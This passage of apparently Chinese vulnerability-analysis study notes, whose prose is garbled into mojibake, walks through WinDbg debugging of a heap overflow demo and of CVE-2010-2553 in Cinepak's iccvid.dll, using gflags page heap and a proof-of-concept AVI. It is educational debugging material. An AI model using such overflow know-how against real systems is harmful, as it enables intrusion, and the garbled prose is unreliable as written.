    è€Œä¸”è¿™ä¸ªç©ºé—²å †å—çš„å…¥å£æ˜¯8705a0(ä¸ä¸Šé¢çš„HeapAllocåˆ†é…åfree[0]ç©ºè¡¨çš„ç¬¬ä¸€ä¸ªå †å—çš„ç´¢å¼•ä¸º8705a8æ­£å¥½å¯¹åº”)
    ä¸ä¸Šé¢çš„dt _heap_entryä¸€æ ·çš„æ˜¯dt _heap_free_entryä¹Ÿä¸èƒ½å¾—åˆ°æƒ³è¦çš„æ•°æ®ä¸‹,å¦‚ä¸‹:
    dt _heap_free_entry 8705a0
        0:000&gt; dt _heap_free_entry 8705a0
        ntdll!_HEAP_FREE_ENTRY
           +0x000 Size             : 0x38a0
           +0x002 Flags            : 0x39 '9'
           +0x003 SmallTagIndex    : 0x1e ''
           +0x000 SubSegmentCode   : 0x1e3938a0 
           +0x004 PreviousSize     : 0x81cd    =====&gt;è¿™é‡Œåº”è¯¥æ˜¯3
           +0x006 SegmentOffset    : 0 ''
           +0x006 LFHFlags         : 0 ''
           +0x007 UnusedBytes      : 0 ''
           +0x000 FunctionIndex    : 0x38a0
           +0x002 ContextValue     : 0x1e39
           +0x000 InterceptorValue : 0x1e3938a0
           +0x004 UnusedBytesLength : 0x81cd
           +0x006 EntryOffset      : 0 ''
           +0x007 ExtendedBlockSignature : 0 ''
           +0x000 Code1            : 0x1e3938a0
           +0x004 Code2            : 0x81cd
           +0x006 Code3            : 0 ''
           +0x007 Code4            : 0 ''
           +0x000 AgregateCode     : 0x81cd`1e3938a0
           +0x008 FreeList         : _LIST_ENTRY [ 0x8700c4 - 0x8700c4 ]
    åœ¨+04çš„åç§»å¤„çš„å€¼æ˜¯ä¸Šä¸€ä¸ªå †å—çš„å¤§å°,ä¸Šä¸€ä¸ªå †å—çš„å¤§å°åº”è¯¥æ˜¯3,è¿™é‡Œç¡®ä¸æ˜¯,è¯´æ˜dt _heap_free_entryå’Œdt
    _heap_entryåœ¨win7 x64ä½ä¸Šéƒ½å·²ç»ä¸å†æœ‰ç”¨äº†,dt _list_entry 8705a0+8è¿˜æ˜¯å¯ä»¥ç”¨çš„,ä¹Ÿå³_list_entryæ²¡æœ‰å˜,å¦‚ä¸‹:
    dt _list_entry 8705a0+8
        0:000&gt; dt _list_entry 8705a0+8
        ntdll!_LIST_ENTRY
         [ 0x8700c4 - 0x8700c4 ]
           +0x000 Flink            : 0x008700c4 _LIST_ENTRY [ 0x8705a8 - 0x8705a8 ]
           +0x004 Blink            : 0x008700c4 _LIST_ENTRY [ 0x8705a8 - 0x8705a8 ]       
    _list_entryå¯ä»¥æ­£å¸¸æ˜¾ç¤º

p
p
p
...
(eip=401084)
    æ­¤å¤„å¯¹åº”çš„æ˜¯å¦‚ä¸‹çš„strcpyçš„å¤åˆ¶è¿‡ç¨‹
    00401084 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
    æ­¤æ—¶æŸ¥çœ‹esiå’Œesiä¸­çš„å†…å®¹å¦‚ä¸‹:
    dd edi
        0:000&gt; dd edi
        00870590  008700c4 008700c4 00000000 00000000
        008705a0  1e3938a0 000081cd 008700c4 008700c4
        008705b0  00000000 00000000 00000000 00000000
        008705c0  00000000 00000000 00000000 00000000
        008705d0  00000000 00000000 00000000 00000000
        008705e0  00000000 00000000 00000000 00000000
        008705f0  00000000 00000000 00000000 00000000
        00870600  00000000 00000000 00000000 00000000
    dd esi
        0:000&gt; dd esi
        0018ff28  41414141 41414141 41414141 41414141
        0018ff38  41414141 41414141 41414141 41414141
        0018ff48  00407000 00401327 00000001 00240f48
        0018ff58  00240f90 00000000 00000000 7efde000
        0018ff68  00000000 00000000 0018ff5c 00000000
        0018ff78  0018ffc4 00402c50 004060b8 00000000
        0018ff88  0018ff94 7563338a 7efde000 0018ffd4
        0018ff98  772f9a02 7efde000 204f7149 00000000
p
(eip=401086)
    æ­¤æ—¶å¤åˆ¶å®Œæˆ,æ­¤æ—¶çš„ç©ºé—²å †å—8705a0(ç´¢å¼•ä¸º8705a8,å †å…¥å£ä¸º8705a0)
    çœ‹çœ‹ç©ºé—²å †å—å˜æˆä»€ä¹ˆäº†
    dt _heap_free_entry 8705a0
        0:000&gt; dt _heap_free_entry 8705a0
        ntdll!_HEAP_FREE_ENTRY
           +0x000 Size             : 0x4141
           +0x002 Flags            : 0x41 'A'
           +0x003 SmallTagIndex    : 0x41 'A'
           +0x000 SubSegmentCode   : 0x41414141 
           +0x004 PreviousSize     : 0x4141
           +0x006 SegmentOffset    : 0x41 'A'
           +0x006 LFHFlags         : 0x41 'A'
           +0x007 UnusedBytes      : 0x41 'A'
           +0x000 FunctionIndex    : 0x4141
           +0x002 ContextValue     : 0x4141
           +0x000 InterceptorValue : 0x41414141
           +0x004 UnusedBytesLength : 0x4141
           +0x006 EntryOffset      : 0x41 'A'
           +0x007 ExtendedBlockSignature : 0x41 'A'
           +0x000 Code1            : 0x41414141
           +0x004 Code2            : 0x4141
           +0x006 Code3            : 0x41 'A'
           +0x007 Code4            : 0x41 'A'
           +0x000 AgregateCode     : 0x41414141`41414141
           +0x008 FreeList         : _LIST_ENTRY [ 0x41414141 - 0x41414141 ]
    8705a0å †å—å¤´ä»¥åŠåé¢çš„FreeListä¸­çš„å‰åå‘æŒ‡é’ˆéƒ½è¢«ä¸Šé¢çš„esiä¸­çš„414141...41è¦†ç›–äº†,å¯æƒ³åé¢å†æ‰§è¡ŒHeapFreeé‡Šæ”¾å·²
    åˆ†é…çš„heapå †å—æ—¶,ä¼šå°†heapå †å—ä¸åé¢çš„ç©ºé—²å †å—8705a0è¿›è¡Œåˆå¹¶,ä¿®æ”¹ä¸¤ä¸ªåˆå¹¶å †å—çš„å‰åå‘æŒ‡é’ˆ,æ­¤æ—¶å°±ä¼šå¼•ç”¨åˆ°
    0x41414141,æœ€åé€ æˆå´©æºƒ.å¦‚æœå°†ä¸Šé¢é‡Šæ”¾å †å—çš„æ“ä½œæ¢æˆåˆ†é…å †å—HeapAlloc(hHeap,0,0x10)ä¹Ÿä¼šå¯¼è‡´å´©æºƒ,å› ä¸ºåœ¨åˆ†é…
    å †å—æ—¶ä¼šå»éå†ç©ºé—²é“¾è¡¨æŒ‡é’ˆ,é€ æˆåœ°å€å¼•ç”¨å¼‚å¸¸.è¿™é‡Œç”±äºåªæ˜¯åˆ†é…äº†ä¸€ä¸ªå †å—(ä»£ç ä¸­ä¸ºHeapAlloc(hHeap,0,0x10)),è¿™
    ä¸€ä¸ªå”¯ä¸€åˆ†é…çš„å †å—åé¢çš„å †å—æ˜¯å‰©ä¸‹çš„ç©ºé—²å †å—,å¦‚æœåˆ†é…å¤šä¸ªå †å—,å…ˆè¢«è¦†ç›–çš„å°±æ˜¯å¤šä¸ªå †å—ä¸­çš„ä¸‹ä¸€ä¸ªå †å—äº†,ä¸€èˆ¬
    ä¸ä¼šè¦†ç›–åˆ°ç©ºé—²å †å—,å¦‚æœç©ºé—²å †å—è¢«è¦†ç›–,è¯´æ˜æ‰€æœ‰çš„å·²åˆ†é…å †å—éƒ½è¢«è¦†ç›–äº†,å› ä¸ºç©ºé—²å †å—åœ¨æ‰€æœ‰å·²åˆ†é…å †å—çš„æœ€å.


åœ¨è¿™é‡Œå¯ä»¥é€šè¿‡å¯¹heapoverflowæ·»åŠ è°ƒè¯•é€‰é¡¹ç”¨äºè¾…åŠ©å †è°ƒè¯•,å¯ä½¿ç”¨windbgæä¾›çš„gflags.exe(ä½äºDebugging Tools for
windowsç›®å½•ä¸‹)æˆ–è€…!gflagå‘½ä»¤è®¾ç½®,ä¸‹é¢æ˜¯å¸¸è§çš„è°ƒè¯•é€‰é¡¹:
    htc:å †å°¾æ£€æŸ¥,åœ¨å †å—æœ«å°¾é™„åŠ é¢å¤–çš„æ ‡è®°ä¿¡æ¯(é€šå¸¸ä¸º8å­—èŠ‚),ä¸”äºæ£€æŸ¥å †å—æ˜¯å¦å‘ç”Ÿæº¢å‡º
    hfc:å †é‡Šæ”¾æ£€æŸ¥,åœ¨é‡Šæ”¾å †å—æ—¶å¯¹å †è¿›è¡Œå„ç§æ£€æŸ¥,é˜²æ­¢å¤šæ¬¡é‡Šæ”¾åŒä¸€ä¸ªå †å—
    hpc:å †å‚æ•°æ£€æŸ¥,å¯¹ä¼ é€’ç»™å †ç®¡ç†çš„å‚æ•°è¿›è¡Œæ›´å¤šçš„æ£€æŸ¥
    ust:ç”¨æˆ·æ€æ ˆå›æº¯,å³å°†æ¯æ¬¡è°ƒç”¨å †å‡½æ•°çš„å‡½æ•°è°ƒç”¨ä¿¡æ¯è®°å½•åˆ°ä¸€ä¸ªæ•°æ®åº“ä¸­
    htg:å †æ ‡å¿—,ä¸ºå †å—æ·»åŠ é™„åŠ æ ‡è®°,ä»¥è®°å½•å †å—çš„ä½¿ç”¨æƒ…å†µæˆ–å…¶ä»–ä¿¡æ¯
    hvc:è°ƒç”¨æ—¶éªŒè¯,å³æ¯æ¬¡è°ƒç”¨å †å‡½æ•°æ—¶éƒ½å¯¹æ•´ä¸ªå †è¿›è¡ŒéªŒè¯å’Œæ£€æŸ¥
    hpa:å¯ç”¨é¡µå †,åœ¨å †å—åå¢åŠ ä¸“é—¨ç”¨äºæ£€æµ‹æº¢å‡ºçš„æ …æ é¡µ,è‹¥å‘ç”Ÿå †æº¢å‡ºè§¦åŠæ …æ é¡µä¾¿ä¼šç«‹åˆ»è§¦å‘å¼‚å¸¸

    ä½¿ç”¨æ–¹æ³•:
    eg.åœ¨windbgå‘½ä»¤ä¸­è¾“å…¥:(win7éœ€è¦ç®¡ç†å‘˜èº«ä»½)
            !gflag -i app.exe +htc +hpa -htg
       åœ¨cmdä¸­è¾“å…¥:(win7éœ€è¦ç®¡ç†å‘˜èº«ä»½)
            gflags -i app.exe +htc +hpa -htg
ä¸€èˆ¬å †å°¾æ£€æŸ¥ä¸»è¦æ˜¯åœ¨æ¯ä¸ªå †å—çš„å°¾éƒ¨,å³ç”¨æˆ·æ•°æ®ä¹‹åæ·»åŠ 8å­—èŠ‚å†…å®¹,é€šå¸¸ä¸ºè¿ç»­çš„2ä¸ª0xabababab,å¦‚æœè¯¥æ®µæ•°æ®è¢«ç ´åå°±
è¯´æ˜å¯èƒ½å­˜åœ¨å †æº¢å‡º.è¿™é‡Œåœ¨heapoverflow.exeä¸­å¼€å¯htcå’Œhpc,å…·ä½“è¿‡ç¨‹å¦‚ä¸‹:

windbgä¸­ctrl+eé€‰æ‹©heapoverflow.exe
    ä¹Ÿå³windbgåŠ è½½heapoverflow.exe,å¦‚æœæ˜¯é™„åŠ è€Œä¸æ˜¯åŠ è½½,å°±æ— æ³•åœ¨å †å°¾æ·»åŠ é¢å¤–çš„æ ‡è®°ä¿¡æ¯,å³æ— æ³•è¿›è¡Œå †å°¾æ£€æŸ¥
!gflag +htc +hpc
    0:000&gt; !gflag +hpc +htc
    New NtGlobalFlag contents: 0x00000050
        htc - Enable heap tail checking
        hpc - Enable heap parameter checking
g
    åœ¨windbgä¸­è¾“å…¥g,å¹¶åœ¨heapoverflow.exeçª—å£ä¸­éšæ„è¾“å…¥å­—ç¬¦å¹¶å›è½¦,ç»“æœå¦‚ä¸‹:
        0:000&gt; g
        HEAP[heapoverflow.exe]: Heap block at 007C0588 modified at 007C05A0 past requested size of 10
        (1b4.11c0): Break instruction exception - code 80000003 (first chance)
        eax=007c0588 ebx=007c05a0 ecx=7733418f edx=0018fb15 esi=007c0588 edi=00000010
        eip=7739152c esp=0018fd5c ebp=0018fd5c iopl=0         nv up ei pl nz na po nc
        cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
        ntdll!RtlpBreakPointHeap+0x23:
        7739152c cc              int     3
    ç»“æœä¸­çš„heap block at 7c0588 modified at 7c05a0 past requested size of 10çš„æ„æ€æ˜¯åœ¨å †å—7c0588ä¸­,æœ‰ä¸ªåœ°å€
    7c05a0è¢«ä¿®æ”¹,å› ä¸ºè¶…è¿‡äº†åŸæ¥ç”³è¯·çš„10ä¸ªå­—èŠ‚å¤§å°.è¿™é‡Œå®é™…åˆ†é…äº†24ä¸ªå­—èŠ‚å¤§å°,æ­£å¥½æ˜¯7c05a0-7c0588=0x18çš„å€¼

é€šè¿‡è¿™é‡Œçš„è°ƒè¯•ä¿¡æ¯,å¤§ä½“å¯ä»¥åˆ¤æ–­å‡ºå †æº¢å‡ºä¸»è¦æ˜¯ç”±äºå‘å¤§å°ä¸º0x10çš„å †ä¸­å¤åˆ¶äº†è¿‡å¤šçš„æ•°æ®å¯¼è‡´çš„,ä½†æ˜¯å¹¶ä¸èƒ½å®šä½åˆ°å¯¼è‡´
æ¼æ´çš„æ±‡ç¼–æŒ‡ä»¤,æ¯”å¦‚å¯¼è‡´å †æº¢å‡ºçš„å­—èŠ‚å¤åˆ¶æŒ‡ä»¤rep movszç­‰,è€Œè¿™é‡Œçš„å †å°¾æ£€æŸ¥æ–¹å¼ä¸»è¦æ˜¯å †è¢«ç ´ååçš„åœºæ™¯,ä¸åˆ©äºå®šä½
å¯¼è‡´æ¼æ´çš„ä»£ç ,å¯ä»¥é€šè¿‡ä½¿ç”¨é¡µå †è°ƒè¯•é€‰é¡¹å®šä½æ¼æ´æŒ‡ä»¤,å…·ä½“å¦‚ä¸‹æ“ä½œ:

windbgåŠ è½½heapoverflow.exe
!gflag +hpa
    0:000&gt; !gflag +hpa
    New NtGlobalFlag contents: 0x02000000
        hpa - Place heap allocations at ends of pages
g
    åœ¨windbgä¸­è¾“å…¥g,å¹¶å­˜heapoverflow.exeä¸­è¾“å…¥ä»»æ„å­—ç¬¦å¹¶å›è½¦,ç»“æœå¦‚ä¸‹:
        0:000&gt; g
        (1074.e3c): Access violation - code c0000005 (first chance)
        First chance exceptions are reported before any exception handling.
        This exception may be expected and handled.
        eax=002705a8 ebx=00000000 ecx=41414141 edx=00270590 esi=00270588 edi=00270000
        eip=772f2fe5 esp=0018fdf0 ebp=0018fed0 iopl=0         nv up ei ng nz na po cy
        cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010283
        ntdll!RtlpFreeHeap+0x4d6:
        772f2fe5 8b19            mov     ebx,dword ptr [ecx]  ds:002b:41414141=????????

kb
    0:000&gt; kb
    ChildEBP RetAddr  Args to Child              
    0018fed0 772f2ce5 00270588 00270590 0018ff49 ntdll!RtlpFreeHeap+0x4d6
    0018fef0 756314bd 00270000 00000000 00270590 ntdll!RtlFreeHeap+0x142
    *** WARNING: Unable to verify checksum for image00400000
    *** ERROR: Module load completed but symbols could not be loaded for image00400000
    WARNING: Stack unwind information not available. Following frames may be wrong.
    0018ff04[00401094] 00270000 00000000 00270590 kernel32!HeapFree+0x14
    0018ff48[00401327]00000001 00540fe8 00541030 image00400000+0x1094
    0018ff88 7563338a 7efde000 0018ffd4 772f9a02 image00400000+0x1327
    0018ff94 772f9a02 7efde000 2fab3393 00000000 kernel32!BaseThreadInitThunk+0x12
    0018ffd4 772f99d5 00401273 7efde000 00000000 ntdll!__RtlUserThreadStart+0x70
    0018ffec 00000000 00401273 7efde000 00000000 ntdll!_RtlUserThreadStart+0x1b

    å…¶ä¸­kbæœ€åä¸€åˆ—ç»“æœä¸ºkbå‘½ä»¤æ‰§è¡Œçš„ç»“æœä¸­çš„å½“å‰æ’çš„ä¸Šä¸€æ’ä¸­çš„RetAddrçš„å€¼
ub image00400000+0x1094
    0:000&gt; ub image00400000+0x1094
    image00400000+0x107f:
    0040107f 6a00            push    0
    00401081 c1e902          shr     ecx,2
    00401084 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
    00401086 8bc8            mov     ecx,eax
    00401088 55              push    ebp
    00401089 83e103          and     ecx,3
    0040108c f3a4            rep movs byte ptr es:[edi],byte ptr [esi]
    0040108e ff1504604000    call    dword ptr [image00400000+0x6004 (00406004)]

ub image00400000+0x1327
    0:000&gt; ub image00400000+0x1327
    image00400000+0x1301:
    00401301 e847120000      call    image00400000+0x254d (0040254d)
    00401306 e8af0e0000      call    image00400000+0x21ba (004021ba)
    0040130b a150994000      mov     eax,dword ptr [image00400000+0x9950 (00409950)]
    00401310 a354994000      mov     dword ptr [image00400000+0x9954 (00409954)],eax
    00401315 50              push    eax
    00401316 ff3548994000    push    dword ptr [image00400000+0x9948 (00409948)]
    0040131c ff3544994000    push    dword ptr [image00400000+0x9944 (00409944)]
    00401322 e8d9fcffff      call    image00400000+0x1000 (00401000)

    ä¹Ÿå³ç¨‹åºå¼‚å¸¸æ—¶æ˜¯ç”±äº40108eå¤„çš„call 406004è¿™æ¡æ±‡ç¼–æŒ‡ä»¤å‡ºäº†é—®é¢˜,è€Œcall 406004è¿™å¥æŒ‡ä»¤æ‰€åœ¨çš„å‡½æ•°å¸§æ‰§æ˜¯401000
    å‡½æ•°å¸§.å› ä¸ºæ ˆä¸­å‹å…¥çš„ä¸¤ä¸ª"è¿”å›åˆ°"çš„åœ°å€åˆ†åˆ«ä¸º401094å’Œ401327,è€Œä¹‹æ‰€ä»¥ä¼šå‹å…¥401094æ˜¯å› ä¸ºå·²ç»æ‰§è¡Œåˆ°äº†40108eå¤„
    çš„call 406004ä¸­çš„406004å‡½æ•°å¸§ä¸­çš„æŒ‡ä»¤,ä½†æ˜¯4006004å‡½æ•°å¸§åœ¨æ²¡æœ‰è¿”å›ä¹‹å‰å¼‚å¸¸äº†,è¯´æ˜401084å¤„å¯¹åº”çš„strcpyå·²ç»æ‰§
    è¡Œå®Œæˆ,ä¹Ÿå³heapå †å·²ç»è¢«è¦†ç›–,è¿™é‡Œä¸ã€Šæ¼æ´æˆ˜äº‰ã€‹ä¹¦ä¸­ä¸åŒ,ä¹¦ä¸­å†™çš„æ˜¯æ²¡æœ‰è¦†ç›–,ä¸ºäº†ç¡®å®šå·²åˆ†é…çš„heapå †æ˜¯å¦è¢«
    è¦†ç›–,æ‰§è¡Œå¦‚ä¸‹æ“ä½œæŸ¥çœ‹:

    !heap
        0:000&gt; !heap
        Details:
        Error address: 002705a0
        Heap handle: 00270000
        Error type heap_failure_buffer_overrun (6)
        Last known valid blocks: before - 00270588, after - 00270fe0
        Stack trace:
                        7734acd3: ntdll!RtlpCoalesceFreeBlocks+0x0000084c
                        772f2dfa: ntdll!RtlpFreeHeap+0x000001f4
                        772f2ce5: ntdll!RtlFreeHeap+0x00000142
                        756314bd: kernel32!HeapFree+0x00000014
        Index   Address  Name      Debugging options enabled
          1:   005a0000                
          2:   00540000                
          3:   00270000   
    !heap -h 270000
        Heap entries for Segment00 in Heap 00270000
            00270000: 00000 . 00588 [101] - busy (587)
            00270588: 00588 . 00018 [00]                                   ===&gt;å¯¹åº”åˆ†é…çš„heapå †å—
            002705a0: 41728 . 20a08 [41] - busy (1c8c7), user flags (2)    ===&gt;å¯¹åº”ç©ºè¡¨å¯¹åº”çš„ç©ºé—²å †å—
        è¿™é‡Œæœ‰ç‚¹å¼‚å¸¸ç°è±¡,ä¸€èˆ¬æ¥è¯´æœ€åä¸€ä¸ªå †å—å…¥å£æ˜¯ç©ºè¡¨å¯¹åº”çš„ç©ºé—²å †å—,è¿™é‡Œ"ç©ºé—²å †å—"å´å˜æˆäº†å ç”¨æ€,è€Œåˆ†é…çš„
        heapå †å—å˜æˆäº†"ç©ºé—²"æ€
    dd 270588
        0:000&gt; dd 270588
        00270588  02000003 0000c315 41414141 41414141
        00270598  41414141 41414141 41414141 41414141
        002705a8  41414141 41414141 00000000 00000000
        002705b8  00000000 00000000 00000000 00000000
        002705c8  00000000 00000000 00000000 00000000
        002705d8  00000000 00000000 00000000 00000000
        002705e8  00000000 00000000 00000000 00000000
        002705f8  00000000 00000000 00000000 00000000
        è¿™é‡Œçœ‹å‡ºåˆ†é…çš„heapå †å—çš„ç¡®å·²ç»è¢«è¦†ç›–äº†è¶…è¿‡0x10é•¿åº¦çš„A
    dd 2705a0
        0:000&gt; dd 2705a0
        002705a0  41414141 41414141 41414141 41414141
        002705b0  00000000 00000000 00000000 00000000
        002705c0  00000000 00000000 00000000 00000000
        002705d0  00000000 00000000 00000000 00000000
        002705e0  00000000 00000000 00000000 00000000
        002705f0  00000000 00000000 00000000 00000000
        00270600  00000000 00000000 00000000 00000000
        00270610  00000000 00000000 00000000 00000000
        è¿™é‡Œç»“åˆä¸Šé¢çš„dd 270588çš„ç»“æœå¯ä»¥çœ‹å‡º,ä¸Šé¢åˆ†é…çš„å †å—è¢«è¦†ç›–,ä¸”å¤šä½™çš„Aè¦†ç›–äº†ç©ºé—²å †å—çš„å—é¦–å’ŒflinkåŠ
        blink,è¯´æ˜çš„ç¡®æ˜¯è¦†ç›–äº†çš„,åªæ˜¯å°±ç®—è¦†ç›–äº†ç©ºé—²å †å—,ä¾ç„¶èƒ½ç”¨!gflag +hpaå®šä½æ¼æ´æŒ‡ä»¤,è€Œä¹‹æ‰€ä»¥æ²¡æœ‰å’Œä¹¦ä¸­è¯´
        çš„æ²¡æœ‰è¦†ç›–åé¢çš„ç©ºé—²å †å—ä¸åŒ,å¤§æ¦‚æ˜¯å’Œä½œè€…çš„æ“ä½œç³»ç»Ÿä¸åŒå¯¼è‡´(è¿™é‡Œç”¨çš„æ˜¯win7 x64,ä¹¦ä¸­åªè¯´æ˜¯win7),æˆ–è€…
        æ˜¯å…¶ä»–åŸå› .
</code></pre></div></div>

<h3 id="0x02-cve-2010-2553åˆ†æ">0x02 cve-2010-2553åˆ†æ</h3>

<h4 id="0x01-about">0x01 about</h4>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>æ¼æ´æè¿°:
    Cinepakè§†é¢‘ç¼–è§£ç å™¨ä¸­çš„iccvid.dllä¸­çš„CVDecompresså‡½æ•°åœ¨è§£å‹ç¼©åª’ä½“æ–‡ä»¶æ—¶æ²¡æœ‰å¯¹ç¼“å†²åŒºå¤§å°è¿›è¡Œæ£€æµ‹,å¯¼è‡´åœ¨å¤åˆ¶
    å‹ç¼©æ•°æ®æ—¶é€ æˆå †æº¢å‡º

å®éªŒç¯å¢ƒ:
    win xp sp3
    windows media player
    turbodiff v1.01b
</code></pre></div></div>

<h4 id="0x02-è°ƒè¯•åˆ†æ">0x02 è°ƒè¯•åˆ†æ</h4>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1&gt;attention

    ä¹¦ä¸­p86é¡µä¸­çš„å¼€å¯é¡µå †çš„æ–¹æ³•æ˜¯å…ˆè¿è¡Œwmplayer.exe,windbgé™„åŠ è¿›ç¨‹åå†åœ¨windbgçš„å‘½ä»¤è¾“å…¥æ¡†ä¸­è¾“å…¥!gflag +hpa,å®
    é™…æ“ä½œä¸­ä¼šæç¤ºä¸èƒ½æˆåŠŸ,å³é”®ä»¥ç®¡ç†èº«ä»½è¿è¡Œä»ç„¶ä¸æˆåŠŸ,å¯èƒ½æ˜¯win xpæˆ–è€…æ˜¯windbgå’Œä¹¦ä¸­ä½œè€…çš„æœ‰ä¸€ç‚¹ä¸åŒæˆ–å…¶ä»–åŸ
    å› ,ä¸è¿‡èƒ½é€šè¿‡cmdä¸­gflags.exe -i wmplayer.exe +hpaæˆåŠŸè®¾ç½®é¡µå †,ä¹¦ä¸­p80ä¸­è¯´çš„åªèƒ½åŠ è½½exeå†åœ¨windbgä¸­è®¾ç½®è°ƒè¯•
    é€‰é¡¹ä¼¼ä¹ä¸p86æœ‰çŸ›ç›¾,ä¸è¿‡p80ä¸­æ˜¯è®¾ç½®çš„å †å°¾çš„è°ƒè¯•é€‰é¡¹,è¿™é‡Œæš‚ä¸”è®¤ä¸º:

        a&gt;å †å°¾åªèƒ½ç”¨p80è¯´çš„windbgåŠ è½½æœªè¿è¡Œçš„exeåå†é€šè¿‡windbfè®¾ç½®!gflag +htc +hpcå®ç°
        b&gt;é¡µå †å¯ä»¥ç”¨p86è¯´çš„windbgé™„åŠ å·²ç»è¿è¡Œçš„exeåå†è®¾ç½®!gflag +hpaå®ç°
        c&gt;å®é™…æ“ä½œä¸­å¯èƒ½ç”±äºç¯å¢ƒé—®é¢˜åœ¨æœ¬æœºçš„win xp sp3ä¸Šåªèƒ½é€šè¿‡ç³»ç»Ÿcmdæ‰§è¡Œgflag.exe -i wmplayer.exe +hpa,è¿è¡Œ
          wmplayer.exe,å†ç”¨windbgé™„åŠ exeè¿›ç¨‹å®ç°,è€Œè¿™ç§æ–¹æ³•åº”è¯¥æ˜¯ç›¸å½“äºaä¸­çš„windbgåŠ è½½çš„æ–¹æ³•

2&gt;æ“ä½œ

win+r:cmd
gflags.exe -i "C:\Program Files\Windows Media Player\wmplayer.exe" +hpa
    Current Registry Settings for wmplayer.exe executable are: 02000000
    hpa - Enable page heap
    è¿™é‡Œæ²¡æœ‰ç”¨ç®¡ç†å‘˜å®Œå…¨èº«ä»½è¿è¡Œcmdä¹Ÿå¯ä»¥æˆåŠŸ

åŒå‡»wmplayer.exe
windbgé™„åŠ wmplayer.exe
!gflag
    0:003&gt; !gflag
    Current NtGlobalFlag contents: 0x02000000
    hpa - Place heap allocations at ends of pages
    windbgä¸­æ£€æŸ¥çš„ç¡®æˆåŠŸè®¾ç½®äº†hpa

g
wmplayer.exeçª—å£ä¸­æ‰“å¼€poc.avi(é…å¥—èµ„æ–™)
    (2e8.644): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    eax=00006000 ebx=07d86fc0 ecx=00000800 edx=07a3fd38 esi=10279000 edi=1027b000
    eip=73b722cc esp=07a3fd04 ebp=07a3fd30 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
    iccvid!CVDecompress+0x11e:
    73b722cc f3a5            rep movs dword ptr es:[edi],dword ptr [esi] es:0023:1027b000=???????? 
    ds:0023:10279000=00930093

kb
    0:010&gt; kb
    ChildEBP RetAddr  Args to Child              
    07a3fd30 73b7cbf3 00000004 00000000 00000068 iccvid!CVDecompress+0x11e
    07a3fd60 73b766c8 07e0ef60 00000000 07e24fd8 iccvid!Decompress+0x11d
    07a3fdac 73b41938 07e0ef60 00000001 0000400d iccvid!DriverProc+0x1bf
    07a3fdd0 7cf8fa9e 73b5b500 0000400d 07a3fde8 MSVFW32!ICSendMessage+0x2b
    07a3fe00 7cf8f9e9 73b5b500 00000000 07e24fd8 quartz!CVFWDynLink::ICDecompress+0x3e
    07a3fec0 7cf90a55 07cf6fa8 06daac90 00000000 quartz!CAVIDec::Transform+0x282
    07a3feec 7cf90939 07cf6fa8 00000000 06dfaee0 quartz!CVideoTransformFilter::Receive+0x110
    07a3ff00 7cf8e67a 0802cf44 07cf6fa8 07a3ff40 quartz!CTransformInputPin::Receive+0x33
    07a3ff10 7cf90ca0 07cf6fa8 00040103 06dfaee0 quartz!CBaseOutputPin::Deliver+0x22
    07a3ff40 7cf90e1c 07a3ff70 07a3ff6c 7c984d69 quartz!CBaseMSRWorker::TryDeliverSample+0x102
    07a3ff84 7cf8ce30 7c984d69 06dfaee0 06dfaee0 quartz!CBaseMSRWorker::PushLoop+0x15e
    07a3ff9c 7cf8dbe6 00000000 7cf8a121 7c984d69 quartz!CBaseMSRWorker::DoRunLoop+0x4a
    07a3ffa4 7cf8a121 7c984d69 00000010 07a3ffec quartz!CBaseMSRWorker::ThreadProc+0x39
    07a3ffb4 7c80b713 06dfaee0 7c984d69 00000010 quartz!CAMThread::InitialThreadProc+0x15
    07a3ffec 00000000 7cf8a10c 06dfaee0 00000000 kernel32!BaseThreadStart+0x37


ub 73b7cbf3
æˆ–è€…
ub iccvid!Decompress+0x11d
    0:010&gt; ub iccvid!Decompress+0x11d
    iccvid!Decompress+0x102:
    73b7cbd8 ffb698000000    push    dword ptr [esi+98h]
    73b7cbde 57              push    edi
    73b7cbdf ff7528          push    dword ptr [ebp+28h]
    73b7cbe2 ff752c          push    dword ptr [ebp+2Ch]
    73b7cbe5 ff7530          push    dword ptr [ebp+30h]
    73b7cbe8 ff7514          push    dword ptr [ebp+14h]
    73b7cbeb ff765c          push    dword ptr [esi+5Ch]
    73b7cbee e8bb55ffff      call    iccvid!CVDecompress (73b721ae)

ub 73b766c8
æˆ–è€…
ub iccvid!DriverProc+0x1bf
    0:010&gt; ub iccvid!DriverProc+0x1bf
    iccvid!DriverProc+0x1ae:
    73b766b7 52              push    edx
    73b766b8 51              push    ecx
    73b766b9 51              push    ecx
    73b766ba ff7008          push    dword ptr [eax+8]
    73b766bd ff7004          push    dword ptr [eax+4]
    73b766c0 ff30            push    dword ptr [eax]
    73b766c2 56              push    esi
    73b766c3 e80e640000      call    iccvid!Decompress (73b7cad6)

    è¿™é‡Œå¯¹æ ˆä¸­æœ€è¿‘çš„ä¸¤ä¸ªè¿”å›åœ°å€ä»¥ä¸Šéƒ¨åˆ†è¿›è¡Œåæ±‡ç¼–,é€šè¿‡ä¸Šé¢ç»“æœå¯ä»¥çœ‹å‡º:
    73b722cc f3a5            rep movs dword ptr es:[edi],dword ptr [esi] es:0023:1027b000=???????? 
    ds:0023:10279000=00930093 è¿™é‡Œå¼‚å¸¸æ—¶eip=73b722ccæ˜¯å±äºå‡½æ•°73b721aeä¸­çš„ä¸€å¥æŒ‡ä»¤,è€Œ73b7cbeeå¤„çš„call 73b721ae
    è¿™ä¸€æ¡æŒ‡ä»¤æ‰€åœ¨çš„å‡½æ•°å¸§æ­£æ˜¯73b7cad6å‡½æ•°å¸§,å¯é€šè¿‡æŸ¥çœ‹|åˆ†è§£|Offset:73b721aeéªŒè¯

